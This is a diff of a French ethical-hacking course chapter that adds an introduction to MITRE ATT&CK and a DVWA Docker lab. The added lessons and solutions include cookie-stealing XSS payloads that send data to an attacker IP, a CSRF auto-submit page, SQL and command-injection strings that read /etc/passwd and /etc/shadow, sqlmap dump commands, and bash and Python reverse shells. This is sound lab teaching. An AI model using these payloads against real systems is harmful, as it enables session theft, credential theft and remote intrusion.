@@ -4,316 +4,513 @@
 
 ## Objectifs pédagogiques
 
-- Distinguer les différents types de hackers (éthiques, malveillants, hacktivistes)
-- Comprendre le panorama des attaques courantes : phishing, DDoS, injections SQL
-- Prendre en main les outils de base : Metasploit, nmap, Wireshark
-- Identifier et comprendre les failles courantes : buffer overflow, XSS, CSRF
-- Simuler des attaques basées sur des vulnérabilités connues
+- Comprendre le référentiel MITRE ATT&CK et savoir naviguer dans sa matrice
+- Distinguer les profils d'attaquants et leurs motivations
+- Cartographier les attaques courantes (phishing, DDoS, injections SQL) aux techniques ATT&CK
+- Prendre en main les outils fondamentaux : nmap, Metasploit, Wireshark
+- Identifier et exploiter les failles web : XSS, CSRF, injection SQL, command injection
+- Lancer un environnement Docker vulnérable et réaliser un premier scan
 
 ---
 
 ## Introduction
 
-Ce chapitre pose les fondations du module de hacking éthique. Avant d'exploiter des failles ou de mettre en place des contre-mesures, il est indispensable de comprendre le paysage des menaces, les profils d'attaquants et les grandes familles de vulnérabilités.
+Toute démarche de sécurité — offensive comme défensive — commence par la compréhension du paysage des menaces. Avant de lancer un scan ou d'exploiter une faille, il est indispensable de disposer d'un **langage commun** pour décrire les comportements adverses.
 
-La cybersécurité repose sur un principe simple : pour se défendre, il faut savoir comment l'attaquant opère. Ce premier jour vous donnera les clés de lecture nécessaires pour aborder le reste de la formation.
+Ce chapitre introduit le référentiel **MITRE ATT&CK**, qui deviendra votre boussole tout au long de cette formation. Chaque attaque, chaque vulnérabilité, chaque technique sera systématiquement rattachée à une entrée de la matrice ATT&CK. C'est le standard industriel adopté par les SOC, les équipes de threat intelligence et les pentesters.
+
+> **Sources :** [MITRE ATT&CK Framework](https://attack.mitre.org/) — The MITRE Corporation.
 
 ---
 
 ## Dépendances / Prérequis
 
-- Connaissances de base en réseaux (TCP/IP, DNS, HTTP)
-- Notions fondamentales en systèmes Linux et Windows
-- Machine virtuelle Kali Linux ou accès aux outils installés
-- `pip install python-nmap scapy requests`
+- Docker et Docker Compose installés sur la machine Kali
+- Outils préinstallés sur Kali : `nmap`, `metasploit-framework`, `wireshark`, `burpsuite`, `sqlmap`
+- Lancer l'environnement : `docker-compose up -d dvwa`
 
 ---
 
-## 1. Introduction au hacking éthique
+## 1. MITRE ATT&CK — Le référentiel universel
 
 ### Comprendre le concept
 
-Le hacking éthique consiste à utiliser les mêmes techniques que les attaquants malveillants, mais dans un cadre légal et avec l'autorisation du propriétaire du système cible. L'objectif est d'identifier les vulnérabilités avant qu'elles ne soient exploitées.
+MITRE ATT&CK est une base de connaissances qui référence les tactiques, techniques et procédures (TTPs) utilisées par les groupes cybercriminels et les APTs (Advanced Persistent Threats). Elle est organisée en 14 tactiques et plus de 200 techniques.
 
-> **Sources :** [CEH Official Guide](https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/) — EC-Council.
+**Tactique** = le « pourquoi » (objectif de l'attaquant : prise d'accès initial, escalade de privilèges, exfiltration…)
+**Technique** = le « comment » (méthode concrète : phishing, buffer overflow, injection SQL…)
+**Procédure** = l'implémentation spécifique d'un groupe d'attaquants
 
-### Types de hackers
+### Les 14 tactiques de la matrice Entreprise
 
 ```mermaid
-flowchart LR
-    A[Hackers] --> B[White Hat]
-    A --> C[Black Hat]
-    A --> D[Grey Hat]
-    A --> E[Hacktivistes]
-    B --> B1[Éthique, autorisé, défensif]
-    C --> C1[Malveillant, illégal, offensif]
-    D --> D1[Zone grise, sans autorisation mais sans malveillance]
-    E --> E1[Motivations politiques ou idéologiques]
+flowchart TB
+    TA0001[Reconnaissance] --> TA0002[Resource Development]
+    TA0002 --> TA0003[Initial Access]
+    TA0003 --> TA0004[Execution]
+    TA0004 --> TA0005[Persistence]
+    TA0005 --> TA0006[Privilege Escalation]
+    TA0006 --> TA0007[Defense Evasion]
+    TA0007 --> TA0008[Credential Access]
+    TA0008 --> TA0009[Discovery]
+    TA0009 --> TA0010[Lateral Movement]
+    TA0010 --> TA0011[Collection]
+    TA0011 --> TA0012[Command and Control]
+    TA0012 --> TA0013[Exfiltration]
+    TA0013 --> TA0014[Impact]
 ```
 
-### Panorama des attaques courantes
+> **Sources :** [ATT&CK Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/) — MITRE.
 
-| Attaque | Description | Impact |
-|---------|-------------|--------|
-| Phishing | Usurpation d'identité pour voler des identifiants | Compromission de comptes |
-| DDoS | Saturation d'un service par un flux de requêtes | Indisponibilité |
-| Injection SQL | Insertion de code SQL dans les entrées utilisateur | Vol de données, destruction de BDD |
+### Pourquoi normaliser avec ATT&CK ?
+
+- **Langage commun** : le pentester et le défenseur parlent le même vocabulaire
+- **Mesure de couverture** : on sait exactement quelles techniques sont testées et lesquelles sont protégées
+- **Priorisation** : les techniques les plus utilisées par les vrais attaquants guident les efforts
+- **Rapport professionnel** : chaque vulnérabilité est taguée ATT&CK, facilitant la compréhension par les SOC/CERT
+
+### Naviguer dans la matrice
+
+```
+Matrice simplifiée JOUR 1
+┌─────────────────────┬──────────────────────────────────────────────┐
+│ Tactique (TA)       │ Techniques (T)                               │
+├─────────────────────┼──────────────────────────────────────────────┤
+│ TA0001 Reconnaissance│ T1595 Active Scanning                        │
+│ TA0003 Initial Access│ T1566 Phishing, T1190 Exploit Public-Facing  │
+│                      │ T1189 Drive-by Compromise (XSS→session steal)│
+│ TA0043 Reconnaissance│ T1046 Network Scanning (nmap)                │
+└─────────────────────┴──────────────────────────────────────────────┘
+```
 
 ---
 
-## 2. Outils de l'attaquant
+## 2. Types de hackers et panorama des attaques
 
-### nmap — Cartographie réseau
+### Profils d'attaquants
 
-```bash
-# Scan de base sur un hôte
-nmap -sV 192.168.1.1
-
-# Scan rapide des 1000 ports les plus courants
-nmap -F 192.168.1.0/24
-
-# Détection d'OS et de versions de services
-nmap -A 192.168.1.1
+```mermaid
+flowchart LR
+    A[Types de Hackers] --> B[White Hat]
+    A --> C[Black Hat]
+    A --> D[Grey Hat]
+    A --> E[Hacktiviste]
+    A --> F[APT / Étatique]
+    B --> B1[Pentester, chercheur\nCadre légal, autorisé]
+    C --> C1[Criminel\nMotivation financière]
+    E --> E1[Militant\nMotivation politique]
+    F --> F1[APT29, Lazarus, etc.\nMotivation étatique\nATT&CK Groups]
 ```
 
-> **Sources :** [nmap Network Scanning](https://nmap.org/book/) — Gordon Lyon.
+Chaque groupe APT documenté dans MITRE ATT&CK possède une fiche dédiée avec ses techniques favorites. Exemple : APT29 (Cozy Bear) utilise T1566 (Spearphishing), T1059 (Command Scripting), T1027 (Obfuscated Files).
+
+### Panorama des attaques — Mapping ATT&CK
+
+| Attaque | Technique ATT&CK | ID | Tactic | Impact |
+|---------|-----------------|-----|--------|--------|
+| Phishing | Spearphishing Attachment | T1566.001 | Initial Access | Compromission de comptes |
+| DDoS | Endpoint Denial of Service | T1499 | Impact | Indisponibilité de service |
+| Injection SQL | Exploit Public-Facing Application | T1190 | Initial Access | Vol/exfiltration de données |
+| XSS | Drive-by Compromise | T1189 | Initial Access | Vol de session, defacement |
+| CSRF | Exploitation for Client Execution | T1203 | Execution | Actions non autorisées |
+
+> **Sources :** [ATT&CK Techniques](https://attack.mitre.org/techniques/enterprise/) — MITRE.
+
+---
+
+## 3. Outils de l'attaquant
+
+### nmap — Cartographie réseau → T1046 Network Service Scanning
+
+nmap est l'outil de reconnaissance réseau par excellence. Il permet d'identifier les hôtes actifs, les ports ouverts et les versions de services.
+
+```bash
+# Scan basique d'un hôte
+nmap -sV <IP>
+
+# Scan rapide de sous-réseau
+nmap -F <IP>/24
+
+# Détection d'OS et versions avec scripts par défaut
+nmap -A <IP>
+
+# Scripts NSE pour vulnérabilités
+nmap --script vuln <IP>
+```
 
 ### Metasploit — Framework d'exploitation
 
-Metasploit est une plateforme modulaire permettant de rechercher, configurer et exécuter des exploits contre des cibles identifiées.
+Metasploit intègre des milliers d'exploits et de payloads. Il est au cœur des phases TA0003 → TA0004 → TA0006 du cycle ATT&CK.
 
 ```bash
-# Lancer la console Metasploit
+# Lancer la console
 msfconsole
 
-# Rechercher un exploit
-search cve:2017-0144
+# Rechercher un exploit par CVE ou mot-clé
+search CVE-2017-0144
 
-# Utiliser un exploit
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 192.168.1.10
+# Configurer et lancer un exploit
+use exploit/<chemin>
+set RHOSTS <IP>
 exploit
 ```
 
-### Wireshark — Analyse de paquets
+### Wireshark — Analyse de paquets → T1040 Network Sniffing
 
-Wireshark capture et analyse le trafic réseau en temps réel. Indispensable pour comprendre les protocoles et détecter des anomalies.
+```bash
+# Filtres utiles
+http                    # Trafic HTTP uniquement
+tcp.port == 80          # Port 80
+ip.addr == <IP>         # Trafic lié à une IP
+tcp.flags.syn == 1      # Paquets SYN (début de connexion)
+```
 
-Filtres courants :
-- `http` — trafic HTTP uniquement
-- `tcp.port == 443` — trafic HTTPS
-- `ip.addr == 192.168.1.1` — tout le trafic lié à cette IP
+> **Sources :** [nmap Network Scanning](https://nmap.org/book/) — Gordon Lyon. [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) — Offensive Security.
 
 ---
 
-## 3. Comprendre les vulnérabilités des systèmes
+## 4. Vulnérabilités web — Mapping ATT&CK
 
-### Buffer Overflow
+### XSS (Cross-Site Scripting) → T1189 Drive-by Compromise
 
-Un buffer overflow (dépassement de tampon) survient quand un programme écrit plus de données dans un buffer que sa capacité ne le permet, écrasant la mémoire adjacente.
+Un attaquant injecte du JavaScript malveillant exécuté dans le navigateur de la victime.
 
-#### Formulation mathématique
+**Reflected XSS :** le payload fait partie de la requête (URL) et est reflété immédiatement.
+**Stored XSS :** le payload est stocké en base de données et exécuté à chaque affichage.
 
-Un buffer de taille $B$ octets reçoit $N$ octets avec $N > B$ :
-
-$$
-\text{Dépassement} = N - B
-$$
-
-Où :
-- $B$ : taille allouée du buffer (en octets)
-- $N$ : nombre d'octets écrits
-- Si $N > B$, les $N - B$ octets excédentaires écrasent la mémoire adjacente
-
-> **Explication de la formule :** Le programme réserve un espace mémoire fixe. Si l'entrée dépasse cet espace, l'excédent déborde sur des zones mémoire critiques (adresse de retour, variables voisines).
-
-```c
-// Exemple vulnérable en C
-#include <stdio.h>
-#include <string.h>
-
-void vulnerable(char *input) {
-    char buffer[16];    // B = 16 octets
-    strcpy(buffer, input); // Pas de vérification de taille !
-    printf("Buffer: %s\n", buffer);
-}
-
-int main() {
-    char payload[64];
-    memset(payload, 'A', 63);  // N = 63 > B = 16
-    payload[63] = '\0';
-    vulnerable(payload);  // Buffer overflow !
-    return 0;
-}
+**Payload classique :**
+```html
+<script>alert('XSS')</script>
 ```
 
-**Résultat attendu :** Segmentation fault ou comportement imprévisible.
+**Payload de vol de cookie (session hijacking) :**
+```html
+<script>
+fetch('http://<KALI_IP>:8000/?c=' + document.cookie);
+</script>
+```
 
-### XSS (Cross-Site Scripting)
+**Impact ATT&CK :** Un XSS réussi permet du Credential Access (T1539 Steal Web Session Cookie).
 
-L'attaque XSS injecte du code JavaScript malveillant dans une page web consultée par d'autres utilisateurs.
+### CSRF (Cross-Site Request Forgery) → T1203 Exploitation for Client Execution
 
-**Types de XSS :**
-- **Reflected** : le script est injecté via l'URL et exécuté immédiatement
-- **Stored** : le script est stocké en base de données et exécuté à chaque affichage
-- **DOM-based** : manipulation du DOM côté client
+Le CSRF force un utilisateur authentifié à exécuter une action sans son consentement.
 
 ```html
-<!-- Exemple de payload XSS simple -->
-<script>document.location='http://evil.com/?cookie='+document.cookie</script>
+<!-- Page malveillante hébergée côté attaquant -->
+<html>
+<body>
+  <form action="http://<TARGET>/change_password.php" method="POST" id="csrf">
+    <input type="hidden" name="new_password" value="hacked">
+    <input type="hidden" name="confirm_password" value="hacked">
+  </form>
+  <script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
 ```
 
-### CSRF (Cross-Site Request Forgery)
+### Injection SQL → T1190 Exploit Public-Facing Application
 
-Le CSRF force un utilisateur authentifié à effectuer une action non désirée sur une application web.
+L'injection SQL consiste à insérer du code malveillant dans une requête SQL via les entrées utilisateur non filtrées.
 
-```html
-<!-- Page malveillante qui déclenche un virement -->
-<img src="https://banque.com/virement?destinataire=hacker&montant=1000" width="0" height="0">
+**Contournement d'authentification :**
+```sql
+admin' OR '1'='1' --
 ```
 
-> **Sources :** [OWASP Top 10](https://owasp.org/www-project-top-ten/) — OWASP Foundation.
+**Extraction de données (UNION-based) :**
+```sql
+' UNION SELECT username, password FROM users --
+```
+
+### Command Injection → T1059 Command and Scripting Interpreter
+
+Exécution de commandes système via une entrée utilisateur.
+
+```bash
+; ls -la /etc/passwd
+| whoami
+&& cat /etc/shadow
+```
 
 ---
 
-## 4. Méthodes d'exploitation
+## 5. Introduction à l'environnement de lab Docker
 
-### Cycle d'une attaque
+Tous les labs de cette formation utilisent Docker. Chaque conteneur expose un service vulnérable isolé.
 
-```mermaid
-flowchart LR
-    A[Reconnaissance] --> B[Scanning]
-    B --> C[Énumération]
-    C --> D[Exploitation]
-    D --> E[Post-exploitation]
-    E --> F[Effacement des traces]
+```bash
+# Lancer tous les conteneurs
+docker-compose up -d
+
+# Lancer uniquement le conteneur nécessaire au jour 1
+docker-compose up -d dvwa
+
+# Voir les conteneurs actifs
+docker-compose ps
+
+# Arrêter tout
+docker-compose down
 ```
 
-### Analyse d'une attaque réelle : le cas EternalBlue (CVE-2017-0144)
+**Architecture du jour 1 :** DVWA expose sur `http://localhost:8080` une application web volontairement vulnérable avec XSS, CSRF, SQLi et Command Injection.
 
-EternalBlue exploitait une vulnérabilité SMBv1 dans Windows. Utilisé par WannaCry en 2017, il a infecté plus de 200 000 machines dans 150 pays.
+```
+┌──────────┐         ┌──────────────────┐
+│   Kali   │ ◄─────► │  Docker DVWA     │
+│ Attaquant│  :8080  │  (web vulnérable)│
+└──────────┘         └──────────────────┘
+```
 
-1. **Port vulnérable** : TCP 445 (SMBv1)
-2. **Type de faille** : Buffer overflow dans le traitement des paquets SMB
-3. **Conséquence** : Exécution de code à distance (RCE)
+> **Sources :** [DVWA GitHub](https://github.com/digininja/DVWA) — digininja.
 
-> **Sources :** [Microsoft Security Bulletin MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) — Microsoft.
+---
+
+## Lab 1 : Prise en main DVWA et ATT&CK Navigator
+
+**Durée estimée :** 1h30
+
+**Contexte :** Machine Kali. Conteneur DVWA en cours d'exécution.
+
+### Objectif
+
+Prendre en main l'environnement Docker, naviguer dans MITRE ATT&CK, identifier et exploiter des vulnérabilités web basiques sur DVWA.
+
+### Étape 1 — Lancement de l'environnement
+
+```bash
+# Depuis la racine du projet
+cd techniques-hacking-mdj
+docker-compose up -d dvwa
+
+# Vérifier que DVWA est accessible
+curl -I http://localhost:8080
+
+# Ouvrir dans le navigateur
+firefox http://localhost:8080
+```
+
+**Credentials DVWA :** `admin` / `password`
+
+Une fois connecté, cliquer sur **DVWA Security** en bas à gauche et régler le niveau sur **low**.
+
+### Étape 2 — Scan du conteneur
+
+```bash
+# Scanner le conteneur DVWA
+nmap -sV -p- localhost -P0
+
+# Résultat attendu :
+# PORT     STATE SERVICE VERSION
+# 8080/tcp open  http    Apache httpd 2.4.x
+```
+
+### Étape 3 — Explorer MITRE ATT&CK Navigator
+
+1. Aller sur https://mitre-attack.github.io/attack-navigator/
+2. Créer une nouvelle « layer »
+3. Ajouter les techniques vues aujourd'hui :
+   - T1566 (Phishing)
+   - T1190 (Exploit Public-Facing Application)
+   - T1189 (Drive-by Compromise)
+   - T1046 (Network Service Scanning)
+   - T1059.004 (Unix Shell)
+
+### Étape 4 — Exploitation XSS (Reflected)
+
+Sur DVWA, section **XSS (Reflected)** :
+
+```html
+<script>alert('XSS fonctionnel')</script>
+```
+
+**Vérification :** Une popup JavaScript doit apparaître. L'application ne filtre pas l'entrée.
+
+**Payload avancé — vol de cookie :**
+```html
+<script>new Image().src='http://<KALI_IP>:8000/?cookie='+document.cookie</script>
+```
+
+```bash
+# Côté Kali : lancer un écouteur HTTP
+python3 -m http.server 8000
+```
+
+### Étape 5 — Exploitation Injection SQL
+
+Sur DVWA, section **SQL Injection** :
+
+```
+# Entrer dans le champ User ID :
+1' OR '1'='1' #
+```
+
+La requête devient : `SELECT * FROM users WHERE id='1' OR '1'='1' #'`
+→ Contournement du filtre et affichage de tous les utilisateurs.
+
+**Extraction avancée avec sqlmap :**
+```bash
+# Récupérer le cookie de session DVWA d'abord (dans le navigateur)
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=XXXX;security=low" \
+  --dbs
+
+# Extraire les tables
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=XXXX;security=low" \
+  -D dvwa --tables
+
+# Dumper les mots de passe
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=XXXX;security=low" \
+  -D dvwa -T users --dump
+```
+
+**Résultat attendu :** Extraction des hashs de mot de passe des utilisateurs DVWA.
+
+### Étape 6 — Command Injection
+
+Sur DVWA, section **Command Injection** :
+
+```
+# Champ IP :
+127.0.0.1; ls /etc/
+127.0.0.1; cat /etc/passwd
+127.0.0.1; whoami
+```
+
+L'application exécute `ping` puis la commande injectée. Résultat : accès au système de fichiers du conteneur.
+
+### Checkpoints
+
+- [ ] DVWA accessible sur http://localhost:8080
+- [ ] Scan nmap réalisé avec version des services
+- [ ] Couche ATT&CK Navigator créée avec les 5 techniques du jour
+- [ ] XSS reflété : popup JavaScript ou cookie capturé sur l'écouteur HTTP
+- [ ] SQLi : affichage des 5 utilisateurs ou extraction sqlmap
+- [ ] Command injection : contenu de /etc/passwd affiché
+
+### Sortie attendue — sqlmap
+
+```
+[INFO] fetching tables for database: 'dvwa'
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+
+
+Database: dvwa
+Table: users
+[5 entries]
++---------+------------+----------+---------+
+| user_id | user       | password | avatar  |
++---------+------------+----------+---------+
+| 1       | admin      | 5f4d...  | /hack...|
+| 2       | gordonb    | e99a...  | /hack...|
+| 3       | 1337       | 8d35...  | /hack...|
+| 4       | pablo      | 0d10...  | /hack...|
+| 5       | smithy     | 5f4d...  | /hack...|
++---------+------------+----------+---------+
+```
+
+### Erreurs fréquentes
+
+- **DVWA inaccessible** : vérifier `docker-compose ps`. Si down → `docker-compose up -d dvwa`
+- **sqlmap cookie erreur** : le cookie expire. Recharger la page DVWA et copier le nouveau cookie
+- **XSS pas d'alerte** : vérifier que le niveau de sécurité DVWA est sur **low**
+- **Command injection muette** : essayer `; id` ou `| whoami` au lieu de `&&`
+
+### Validation technique
+
+```bash
+# Vérification syntaxe
+python3 -m py_compile labs/jour1/*.py 2>/dev/null || echo "Pas de scripts Python"
+
+# Vérification fonctionnelle
+curl -s http://localhost:8080 | head -5
+```
 
 ---
 
 ## Exercices
 
-### Exercice 1 : Scan de réseau avec nmap
+### Exercice 1 : Première couche ATT&CK Navigator
 
-**Énoncé :** Réalisez un scan complet d'une machine cible locale et identifiez les services exposés.
+**Énoncé :** Ouvrez ATT&CK Navigator et créez une couche contenant uniquement les 5 techniques vues aujourd'hui. Exportez-la en JSON.
 
-**Sources :** [nmap Book](https://nmap.org/book/)
+**Contexte :** https://mitre-attack.github.io/attack-navigator/
 
-**Contexte :** Machine Kali Linux ou environnement avec nmap installé.
+<details>
+<summary><strong>Solution</strong></summary>
+
+**Étape 1 :** Aller sur le Navigator, cliquer "Create New Layer", choisir "Enterprise ATT&CK v15"
+
+**Étape 2 :** Dans la barre de recherche, ajouter une à une :
+- `T1566` → Phishing
+- `T1190` → Exploit Public-Facing Application
+- `T1189` → Drive-by Compromise
+- `T1046` → Network Service Scanning
+- `T1059.004` → Unix Shell
+
+**Étape 3 :** Colorer chaque technique (ex: rouge = testé, orange = à tester)
+
+**Étape 4 :** Exporter → "Download as JSON"
+</details>
+
+### Exercice 2 : Mapping d'attaque réelle
+
+**Énoncé :** L'attaque WannaCry (2017) utilisait EternalBlue pour se propager. Retrouvez dans ATT&CK quelle technique correspond à EternalBlue.
+
+<details>
+<summary><strong>Solution</strong></summary>
+
+**EternalBlue (CVE-2017-0144)** → Technique ATT&CK : **T1210 Exploitation of Remote Services**
+
+- Tactique : TA0008 Lateral Movement
+- Description : l'exploit cible le service SMBv1 sur le port 445 pour exécuter du code à distance
+- Groupe connu : Lazarus Group (APT38) utilise cette technique
+</details>
+
+### Exercice 3 : DVWA — Command Injection avancée
+
+**Énoncé :** Sur la page Command Injection de DVWA, essayez d'écrire un reverse shell vers votre Kali.
 
 <details>
 <summary><strong>Solution</strong></summary>
 
 ```bash
-# Scan des ports ouverts avec détection de version
-nmap -sV -p- 192.168.1.10
+# Côté Kali : écouter sur le port 4444
+nc -lvnp 4444
 
-# Analyse complète
-nmap -A 192.168.1.10
+# Dans DVWA Command Injection :
+; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
+
+# Alternative si bash -i bloqué :
+; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 ```
 
-**Résultat attendu :**
-```
-PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 7.4
-80/tcp  open  http        Apache httpd 2.4.6
-445/tcp open  netbios-ssn Samba smbd 3.X
-```
+Si ça ne marche pas, vérifier que le conteneur peut joindre Kali (ils sont sur le même réseau Docker bridge). Utiliser `ip addr show docker0` pour trouver le bridge IP.
 </details>
-
-### Exercice 2 : Simulation d'injection SQL
-
-**Énoncé :** Testez une injection SQL simple sur une application vulnérable locale (DVWA ou similaire).
-
-<details>
-<summary><strong>Solution</strong></summary>
-
-```sql
--- Injection SQL classique : contournement d'authentification
-' OR '1'='1' --
-
--- Extraction de données
-' UNION SELECT username, password FROM users --
-```
-</details>
-
----
-
-## Lab : Prise en main des outils du pentester
-
-**Durée estimée :** 1h30
-
-**Contexte :** Machine virtuelle Kali Linux, cible Metasploitable 2.
-
-### Objectif
-
-Configurer un environnement de test, scanner une cible et exploiter une vulnérabilité basique avec Metasploit.
-
-### Instructions
-
-1. Déployer Metasploitable 2 en VM
-2. Scanner la cible avec nmap
-3. Identifier un service vulnérable (ex : vsftpd 2.3.4)
-4. Lancer Metasploit et exploiter la vulnérabilité
-
-### Code
-
-```python
-#!/usr/bin/env python3
-"""
-Script de scan automatisé avec python-nmap.
-"""
-
-import nmap
-
-def scan_target(target: str) -> dict:
-    nm = nmap.PortScanner()
-    nm.scan(target, arguments='-sV -p 21,22,23,80,445')
-    results = {}
-    for host in nm.all_hosts():
-        results[host] = {}
-        for proto in nm[host].all_protocols():
-            ports = nm[host][proto].keys()
-            for port in ports:
-                service = nm[host][proto][port]
-                results[host][port] = {
-                    'name': service.get('name', 'unknown'),
-                    'version': service.get('version', 'unknown'),
-                }
-    return results
-
-if __name__ == "__main__":
-    target = input("IP cible : ")
-    results = scan_target(target)
-    import json
-    print(json.dumps(results, indent=2))
-```
 
 ---
 
 ## Points clés à retenir
 
-- Le hacking éthique est une pratique légale et professionnelle de test d'intrusion
-- Les principales familles d'attaque sont : phishing, DDoS, injections, buffer overflow, XSS, CSRF
-- Les outils fondamentaux sont nmap (scan), Metasploit (exploitation), Wireshark (analyse)
-- La méthodologie suit un cycle : reconnaissance → scan → énumération → exploitation → post-exploitation → nettoyage
-- Chaque vulnérabilité suit une logique technique qu'il faut comprendre avant de pouvoir l'exploiter ou s'en défendre
+- MITRE ATT&CK est votre référentiel : chaque attaque se mappe à une technique (ID commençant par T)
+- Les 14 tactiques couvrent le cycle complet d'une attaque, de la reconnaissance à l'impact
+- Les outils fondamentaux sont nmap (T1046), Metasploit, Wireshark (T1040)
+- XSS → T1189 (Drive-by Compromise), SQLi → T1190 (Exploit Public-Facing Application)
+- Command Injection → T1059.004 (Unix Shell)
+- L'environnement de lab utilise Docker : reproductible, isolé, standardisé
+- DVWA expose les 4 familles de vulnérabilités web sur un seul conteneur
 
 ## Pour aller plus loin
 
-- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
-- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
-- [Hack The Box Academy](https://academy.hackthebox.com/)
+- [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
+- [ATT&CK for Enterprise — Full Matrix](https://attack.mitre.org/matrices/enterprise/)
+- [DVWA GitHub](https://github.com/digininja/DVWA)
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
 
 ---
 
